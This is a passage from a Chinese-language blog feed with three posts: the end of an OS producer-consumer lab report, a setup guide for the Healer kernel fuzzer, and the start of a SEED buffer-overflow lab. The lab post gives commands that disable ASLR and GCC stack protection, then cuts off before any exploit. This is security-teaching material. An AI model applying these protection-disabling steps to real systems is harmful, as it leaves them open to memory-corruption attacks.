src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130180507984.png" alt="image-20211130180507984"></p><h2 id="实验总结和心得"><a href="#实验总结和心得" class="headerlink" title="实验总结和心得"></a>实验总结和心得</h2><ul><li><p>开始看到这个实验的题目时，头绪不多。因为所需要用到的Linux相关库<code>&lt;sys/shm.h&gt;</code>、<code>&lt;sys/sem.h&gt;</code>是之前没有接触过的。之后我通过查找资料，更好地了解如何使用它们实现生产者-消费者问题，具体使用的库函数可详见我上方的实验报告。这个过程中踩的一些坑被我记录下来：</p><ul><li>要额外定义一个void指针addr保存shmat的返回值，直接用循环队列指针*bf保存会导致类型不匹配。</li></ul><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130190423742.png" alt="image-20211130190423742"></p><ul><li><p>刚开始运行时提示错误“共享内存创建失败”。</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130190738319.png" alt="image-20211130190738319"></p><ul><li><p>这是因为创建共享内存的函数的第三个参数没有或上<code>IPC_CREAT</code>。</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130190943965.png" alt="image-20211130190943965"></p></li></ul></li><li><p>如何打印缓冲区中的数据是需要细心考虑的：</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130191121626.png" alt="image-20211130191121626"></p><ul><li>in记录的是缓冲中下一个空位，in-1就是缓冲中最后一个满位。out记录的缓冲中第一个满位。对于一个表示缓冲区的循环队列（数组实现），in-1可能在out“前面”，即<code>in-1&lt;out</code>。这时就需要将last赋值为<code>in-1+MAX_BUFFER_SIZE</code>，做<code>% MAX_BUFFER_SIZE</code>后就可指向缓冲区数组的正确位置。</li></ul></li></ul></li><li><p>时间的处理主要用到<code>timeval</code>结构体，在前文也已进行说明。错误提示输出<code>perror()</code>和较美观的输出界面体现了人性化设计。</p></li><li><p>整个问题的实现可以由实验指导书的流程图较好地被标示出来，理解了这几个流程后，多点耐心、细心就可以完成代码实现。</p></li><li><p>对于思考题中的线程实现，则需要去了解库<code>&lt;pthread.h&gt;</code>和<code>&lt;semaphore.h&gt;</code>。整体框架和进程实现大同小异，不同点在思考题已做说明。</p></li><li><p>总的来说，这次实验让我对生产者-消费者问题的实现和基于Linux环境的C语言编程有了更加深刻的了解，较好地锻炼了我的逻辑思维和代码设计能力。</p></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>《【操作系统实验】Linux环境下用进程实现生产者消费者问题——C语言完整代码+详细实验报告》:<a href="https://blog.csdn.net/qq_44528283/article/details/114801233">https://blog.csdn.net/qq_44528283/article/details/114801233</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Healer的安装和初步使用</title>
    <link href="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <url>/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Healer的安装和初步使用"><a href="#Healer的安装和初步使用" class="headerlink" title="Healer的安装和初步使用"></a><a href="https://github.com/SunHao-0/healer">Healer的安装和初步使用</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    Healer 是受 Syzkaller 启发的内核模糊测试器。<br>​    与 Syzkaller 类似，Healer 使用 Syzlang 描述提供的 syscall 信息生成确认参数结构约束和部分语义约束的系统调用序列，并通过不断执行生成的调用序列导致内核崩溃，从而发现内核错误。<br>​    与 Syzkaller 不同，Healer 不使用经验选择表，而是通过动态移除最小化调用序列中的调用并观察覆盖变化，来检测系统调用之间的影响关系，并利用影响关系来指导调用序列的生成和变异。 此外，Healer 还使用了与 Syzkaller 不同的架构设计。</p><h2 id="构建Healer"><a href="#构建Healer" class="headerlink" title="构建Healer"></a>构建Healer</h2><ul><li><p>除了一些修补代码之外，Healer 是用纯rust编写的。 因此，首先应安装 rust 工具链。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh <br>rustc --version # check install<br></code></pre></div></td></tr></table></figure><p>检查安装结果：</p><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129084016844.png" alt="image-20211129084016844"></p></li><li><p>为了使用 Syzlang 描述，Healer 的构建脚本会自动下载 Syzkaller 并在源代码中添加补丁并构建 Syzkaller，这可能会增加构建时间。 因此，需要安装Syzkaller 所需的构建工具，例如：GO111MODULE开启的golang 编译器，GCC 6.1.0 或更高版本。</p><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129083949436.png" alt="image-20211129083949436"></p><ul><li><p>GO111MODULE的开启命令：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">go env -w GO111MODULE=&quot;on&quot;<br>go env #check<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>一旦安装了所有必需的工具，就可以使用<strong>以下命令</strong>轻松构建 Healer：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cargo build --release<br></code></pre></div></td></tr></table></figure></li><li><p>最后，可以在 <code>target/release</code>目录中找到 Healer 本身和打补丁的 Syzkaller 二进制文件 (<code>syz-bin</code>)。</p><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129083924376.png" alt="image-20211129083924376"></p></li></ul><h2 id="使用-Healer-对-Linux-内核进行模糊测试"><a href="#使用-Healer-对-Linux-内核进行模糊测试" class="headerlink" title="使用 Healer 对 Linux 内核进行模糊测试"></a>使用 Healer 对 Linux 内核进行模糊测试</h2><p>​    总的来说，使用 Healer 对 Linux 内核进行模糊测试需要三个步骤：(1) 准备磁盘映像，(2) 编译内核， (3) 启动 Healer。</p><p>​    Healer 使用 qumu 来引导内核，所以需要准备磁盘镜像和内核镜像。启动后的 qemu 需要能够通过 ssh 密钥登录，内核至少需要具备 kcov 功能。(可以参照Syzkaller文档的详细介绍)</p><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt update <br>sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev <br></code></pre></div></td></tr></table></figure><h3 id="准备磁盘映像"><a href="#准备磁盘映像" class="headerlink" title="准备磁盘映像"></a>准备磁盘映像</h3><h4 id="安装-debootstrap"><a href="#安装-debootstrap" class="headerlink" title="安装 debootstrap"></a>安装 debootstrap</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt install debootstrap<br></code></pre></div></td></tr></table></figure><h4 id="创建-Debian-Stretch-Linux-映像"><a href="#创建-Debian-Stretch-Linux-映像" class="headerlink" title="创建 Debian Stretch Linux 映像"></a>创建 Debian Stretch Linux 映像</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">mkdir $IMAGE <br>cd $IMAGE/ wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh <br>chmod +x create-image.sh <br>./create-image.sh<br></code></pre></div></td></tr></table></figure><ul><li>注意将<code>$IMAGE</code>替换为自己的路径。</li></ul><h4 id="附加工具"><a href="#附加工具" class="headerlink" title="附加工具"></a>附加工具</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./create-image.sh --feature full<br>./create-image.sh --add-perf<br></code></pre></div></td></tr></table></figure><h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><h4 id="获取内核源码"><a href="#获取内核源码" class="headerlink" title="获取内核源码"></a>获取内核源码</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">git clone --branch v5.14 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git $KERNEL<br></code></pre></div></td></tr></table></figure><ul><li>建议从最新的稳定版本开始。V5.14是一个示例。</li><li>在虚拟机中<code>git clone</code>运行时间较长。在较好的网络环境下，可以选择在物理机中前往<code>https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/</code>下载内核源码的压缩包，然后拖入虚拟机解压</li></ul><h4 id="生成默认配置"><a href="#生成默认配置" class="headerlink" title="生成默认配置"></a>生成默认配置</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd $KERNEL<br>make defconfig<br>make kvm_guest.config<br></code></pre></div></td></tr></table></figure><ul><li>同样注意将<code>$IMAGE</code>替换为自己的路径。</li></ul><h4 id="启用所需的配置选项"><a href="#启用所需的配置选项" class="headerlink" title="启用所需的配置选项"></a>启用所需的配置选项</h4><ul><li>手动编辑<code>.config</code>文件来启用它们:</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Coverage collection.</span><br>CONFIG_KCOV=y<br><br><span class="hljs-comment"># Debug info for symbolization.</span><br>CONFIG_DEBUG_INFO=y<br><br><span class="hljs-comment"># Memory bug detector</span><br>CONFIG_KASAN=y<br>CONFIG_KASAN_INLINE=y<br><br><span class="hljs-comment"># Required for Debian Stretch</span><br>CONFIG_CONFIGFS_FS=y<br>CONFIG_SECURITYFS=y<br></code></pre></div></td></tr></table></figure><ul><li><p>重新生成配置:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">make olddefconfig<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="编译内核命令"><a href="#编译内核命令" class="headerlink" title="编译内核命令"></a>编译内核命令</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">make -j`nproc`<br></code></pre></div></td></tr></table></figure><ul><li><p>检查:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ls $KERNEL/vmlinux<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sample output - <span class="hljs-variable">$KERNEL</span>/vmlinux</span><br>ls $KERNEL/arch/x86/boot/bzImage<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sample output - <span class="hljs-variable">$KERNEL</span>/arch/x86/boot/bzImage</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129091321934.png" alt="image-20211129091321934"></p></li></ul><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt install qemu-system-x86<br></code></pre></div></td></tr></table></figure><h4 id="核查"><a href="#核查" class="headerlink" title="核查"></a>核查</h4><ul><li><p>先确定虚拟机的处理器开启<code>虚拟化引擎</code>-<code>虚拟化Intel VT-x/EPT或AMD-V/RVI</code> (我使用的是VMware Workstation)</p><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129092011086.png" alt="image-20211129092011086" style="zoom: 50%;"></p></li><li><p>确认<code>sshd</code>开启</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ps -e |grep ssh<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129092306518.png" alt="image-20211129092306518"></p><ul><li><p>如果没有出现<code>sshd</code>，则输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">/etc/init.d/ssh start<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>正式启动QEMU：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel $KERNEL/arch/x86/boot/bzImage \<br>-append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \<br>-drive file=$IMAGE/stretch.img,format=raw \<br>-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>-net nic,model=e1000 \<br>-enable-kvm \<br>-nographic \<br>-pidfile vm.pid \<br><span class="hljs-meta prompt_">2&gt;</span><span class="language-bash">&amp;1 | <span class="hljs-built_in">tee</span> vm.log</span><br></code></pre></div></td></tr></table></figure><ul><li>同样注意路径替换</li></ul><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129093353035.png" alt="image-20211129093353035"></p><ul><li>输入root即可登录</li></ul><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129093430583.png" alt="image-20211129093430583"></p></li><li><p>此后，可以在另一终端中测试ssh能否工作</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i $IMAGE/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129093824085.png" alt="image-20211129093824085"></p></li></ul><h3 id="运行Healer"><a href="#运行Healer" class="headerlink" title="运行Healer"></a>运行Healer</h3><ul><li><p>一旦<code>stretch.img</code>（<code>$IMAGE/stretch.img</code>）、<code>ssh-stretch.id_rsa</code>（<code>$IMAGE/ssh-stretch.id_rsa</code>）、<code>bzImage</code>（<code>$KERNEL/linux-5.14/arch/x86/boot/bzImage</code>准备就绪，建议是创建一个工作目录<code>workdir</code>。 然后，在 <code>workdir</code> 中创建一个 <code>bin</code> 目录，并将修补后的 <code>Syzkaller</code> 二进制文件和修复程序二进制文件复制到该目录中（<code>healer-main/target/release/syz-bin</code>），注意不要更改 <code>syz-bin</code> 目录结构。 最终的工作目录需要有以下文件。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd path/to/workdir &amp;&amp; ls  <br>bin  bzImage  stretch.id_rsa  stretch.img <br>ls ./bin <br>healer linux_amd64  syz-repro  syz-symbolize  syz-sysgen<br></code></pre></div></td></tr></table></figure></li><li><p>最后，在<code>workdir</code>执行以下命令开始模糊测试，其中 -d 指定磁盘映像的路径，-k 指定内核映像的路径，—ssh-key 指定 ssh 密钥的路径。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo ./bin/healer -d stretch.img --ssh-key stretch.id_rsa -k bzImage <br></code></pre></div></td></tr></table></figure></li><li><p>若正常运行，界面如下：  <img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129150723525.png" alt="image-20211129150723525"></p></li></ul><h4 id="遇到的错误"><a href="#遇到的错误" class="headerlink" title="遇到的错误"></a>遇到的错误</h4><p><strong>1</strong></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./bin/healer -d stretch.img --ssh-key stretch.id_rsa -k bzImage</span><br><br> ___   ___   ______   ________   __       ______   ______<br>/__/\ /__/\ /_____/\ /_______/\ /_/\     /_____/\ /_____/\<br>\::\ \\  \ \\::::_\/_\::: _  \ \\:\ \    \::::_\/_\:::_ \ \<br> \::\/_\ .\ \\:\/___/\\::(_)  \ \\:\ \    \:\/___/\\:(_) ) )_<br>  \:: ___::\ \\::___\/_\:: __  \ \\:\ \____\::___\/_\: __ `\ \<br>   \: \ \\::\ \\:\____/\\:.\ \  \ \\:\/___/\\:\____/\\ \ `\ \ \<br>    \__\/ \::\/ \_____\/ \__\/\__\/ \_____\/ \_____\/ \_\/ \_\/<br><br>[2021-11-28T05:20:10Z INFO  healer_fuzzer] loading target linux/amd64...<br>[2021-11-28T05:20:15Z INFO  healer_fuzzer] pre-booting one vm...<br>Error: failed to boot qemu<br><br>Caused by:<br>    boot: failed to boot in 0s: &quot;qemu-system-x86_64&quot; &quot;-display&quot; &quot;none&quot; &quot;-serial&quot; &quot;stdio&quot; &quot;-no-reboot&quot; &quot;-snapshot&quot; &quot;-device&quot; &quot;virtio-rng-pci&quot; &quot;-enable-kvm&quot; &quot;-cpu&quot; &quot;host,migratable=off&quot; &quot;-m&quot; &quot;4096&quot; &quot;-smp&quot; &quot;2&quot; &quot;-device&quot; &quot;e1000,netdev=net0&quot; &quot;-netdev&quot; &quot;user,id=net0,host=10.0.2.10,hostfwd=tcp::1025-:22&quot; &quot;-drive&quot; &quot;file=/home/yuhan/workdir/stretch.img,index=0,media=disk&quot; &quot;-kernel&quot; &quot;/home/yuhan/workdir/bzImage&quot; &quot;-append&quot; &quot;root=/dev/sda console=ttyS0 kvm-intel.nested=1 kvm-intel.unrestricted_guest=1 kvm-intel.vmm_exclusive=1 kvm-intel.fasteoi=1 kvm-intel.ept=1 kvm-intel.flexpriority=1 kvm-intel.vpid=1 kvm-intel.emulate_invalid_guest_state=1 kvm-intel.eptad=1 kvm-intel.enable_shadow_vmcs=1 kvm-intel.pml=1 kvm-intel.enable_apicv=1 earlyprintk=serial oops=panic nmi_watchdog=panic panic_on_warn=1 panic=1 ftrace_dump_on_oops=orig_cpu vsyscall=native net.ifnames=0 biosdevname=0&quot; &quot;-device&quot; &quot;ivshmem-plain,memdev=hostmem0&quot; &quot;-object&quot; &quot;memory-backend-file,size=4194304,share,mem-path=/dev/shm/healer-in_shm-0-35410,id=hostmem0&quot; &quot;-device&quot; &quot;ivshmem-plain,memdev=hostmem1&quot; &quot;-object&quot; &quot;memory-backend-file,size=16777216,share,mem-path=/dev/shm/healer-out_shm_0-35410,id=hostmem1&quot;<br>    stderr:<br>    failed to boot, qemu exited with: signal: 6 (core dumped)<br>    cmdline: &quot;qemu-system-x86_64&quot; &quot;-display&quot; &quot;none&quot; &quot;-serial&quot; &quot;stdio&quot; &quot;-no-reboot&quot; &quot;-snapshot&quot; &quot;-device&quot; &quot;virtio-rng-pci&quot; &quot;-enable-kvm&quot; &quot;-cpu&quot; &quot;host,migratable=off&quot; &quot;-m&quot; &quot;4096&quot; &quot;-smp&quot; &quot;2&quot; &quot;-device&quot; &quot;e1000,netdev=net0&quot; &quot;-netdev&quot; &quot;user,id=net0,host=10.0.2.10,hostfwd=tcp::1025-:22&quot; &quot;-drive&quot; &quot;file=/home/yuhan/workdir/stretch.img,index=0,media=disk&quot; &quot;-kernel&quot; &quot;/home/yuhan/workdir/bzImage&quot; &quot;-append&quot; &quot;root=/dev/sda console=ttyS0 kvm-intel.nested=1 kvm-intel.unrestricted_guest=1 kvm-intel.vmm_exclusive=1 kvm-intel.fasteoi=1 kvm-intel.ept=1 kvm-intel.flexpriority=1 kvm-intel.vpid=1 kvm-intel.emulate_invalid_guest_state=1 kvm-intel.eptad=1 kvm-intel.enable_shadow_vmcs=1 kvm-intel.pml=1 kvm-intel.enable_apicv=1 earlyprintk=serial oops=panic nmi_watchdog=panic panic_on_warn=1 panic=1 ftrace_dump_on_oops=orig_cpu vsyscall=native net.ifnames=0 biosdevname=0&quot; &quot;-device&quot; &quot;ivshmem-plain,memdev=hostmem0&quot; &quot;-object&quot; &quot;memory-backend-file,size=4194304,share,mem-path=/dev/shm/healer-in_shm-0-35410,id=hostmem0&quot; &quot;-device&quot; &quot;ivshmem-plain,memdev=hostmem1&quot; &quot;-object&quot; &quot;memory-backend-file,size=16777216,share,mem-path=/dev/shm/healer-out_shm_0-35410,id=hostmem1&quot;<br>    STDERR:<br>    qemu-system-x86_64: error: failed to set MSR 0x48f to 0x7fffff00036dfb<br>    qemu-system-x86_64: /build/qemu-A1914X/qemu-4.2/target/i386/kvm.c:2691: kvm_buf_set_msrs: Assertion `ret == cpu-&gt;kvm_msr_buf-&gt;nmsrs&#x27; failed.<br></code></pre></div></td></tr></table></figure><p><strong>解决方案</strong></p><p>找到<code>healer-main/healer_utils/healer_vm/src/qemu.rs</code>，这是healer中关于qemu的配置文件。将<code>“linux/amd64”</code>的对应参数<code>args</code>改为：<code>&quot;-enable-kvm&quot;</code>（下图中的第487行）。</p><p><img src="/2021/11/27/Healer%E7%9A%84%E5%AE%89%E8%A3%85/image-20211129152303710.png" alt="image-20211129152303710"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://github.com/SunHao-0/healer">https://github.com/SunHao-0/healer</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Fuzzing相关学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统软件安全</tag>
      
      <tag>Fuzzing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buffer-Overflow_Vulnerability_Lab</title>
    <link href="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/"/>
    <url>/2021/11/20/Buffer-Overflow_Vulnerability_Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-Vulnerability-Lab"><a href="#Buffer-Overflow-Vulnerability-Lab" class="headerlink" title="Buffer-Overflow_Vulnerability_Lab"></a><a href="https://seedsecuritylabs.org/Labs_16.04/Software/Buffer_Overflow/">Buffer-Overflow_Vulnerability_Lab</a></h1><ul><li>注：经过听说和实践，Seed_Ubuntu20.04在做这个实验时bug较多，故选用了SeedUbuntu16.04的实验版本（结果也有小问题）。</li></ul><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><ul><li>本实验的学习目标是让学生通过将他们在课堂上学到的关于缓冲区溢出漏洞的知识付诸实践，获得有关缓冲区溢出漏洞的第一手经验。 缓冲区溢出被定义为程序试图将数据写入超出预先分配的固定长度缓冲区边界的情况。 该漏洞可被恶意用户用来改变程序的流量控制，导致恶意代码的执行。</li><li>在本实验中，学生将获得一个具有缓冲区溢出漏洞的程序； 他们的任务是开发利用漏洞的方案，最终获得root权限。 除了攻击之外，还将引导学生了解操作系统中实施的几种保护方案，以应对缓冲区溢出攻击。 学生需要评估这些计划是否有效并解释原因。 本实验涵盖以下主题：<ul><li>缓冲区溢出漏洞和攻击</li><li>函数调用中的堆栈布局</li><li>解决随机化、非可执行堆栈和<code>StackGuard</code></li><li>Shellcode。我们有一个独立的实验，专门研究如何从头开始编写shellcode。</li><li><code>return-to-libc</code>攻击，其目的是击败非可执行堆栈对策，包括在一个单独的实验中。</li></ul></li><li>不同的值可以使解决方案不同。本次实验的BUF_SIZE是24。</li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>SEED_Ubuntu 16.04虚拟机</li></ul><h2 id="2-实验任务"><a href="#2-实验任务" class="headerlink" title="2. 实验任务"></a>2. 实验任务</h2><h3 id="2-1-关闭对策"><a href="#2-1-关闭对策" class="headerlink" title="2.1 关闭对策"></a>2.1 关闭对策</h3><ul><li>Ubuntu和其他Linux发行版已经实现了一些安全机制，使缓冲区溢出攻击变得困难。为了简化我们的攻击，我们需要先摧毁他们。稍后，我们将逐个启用它们，看看我们的攻击是否还能成功。</li></ul><h4 id="地址空间随机化"><a href="#地址空间随机化" class="headerlink" title="地址空间随机化"></a>地址空间随机化</h4><ul><li>Ubuntu和其他几个基于Linux的系统使用地址空间随机化来随机化堆和堆栈的起始地址。这使得猜测确切地址变得困难；猜测地址是缓冲区溢出攻击的关键步骤之一。在本实验室中，我们使用以下命令禁用此功能：</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -w kernel.randomize_va_space=0</span><br></code></pre></div></td></tr></table></figure><p><strong>实验操作</strong></p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211119212645372.png" alt="image-20211119212645372"></p><h4 id="StackGuard保护方案"><a href="#StackGuard保护方案" class="headerlink" title="StackGuard保护方案"></a>StackGuard保护方案</h4><ul><li><p>GCC编译器实现了一种称为<code>StackGuard</code>的安全机制，以防止缓冲区溢出。在存在这种保护的情况下，缓冲区溢出攻击将不起作用。</p></li><li><p>我们可以在编译期间使用<code>-fno-stack-protector</code>选项禁用此保护。例如，要编译一个禁用<code>StackGuard</code>的程序<code>example.c</code>，我们可以做以下操作:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -fno-stack-protector example.c</span><br></code></pre></div></td></tr></table></figure></li></ul><h4 id="Non-Executable-Stack"><a href="#Non-Executable-Stack" class="headerlink" title="Non-Executable Stack"></a>Non-Executable 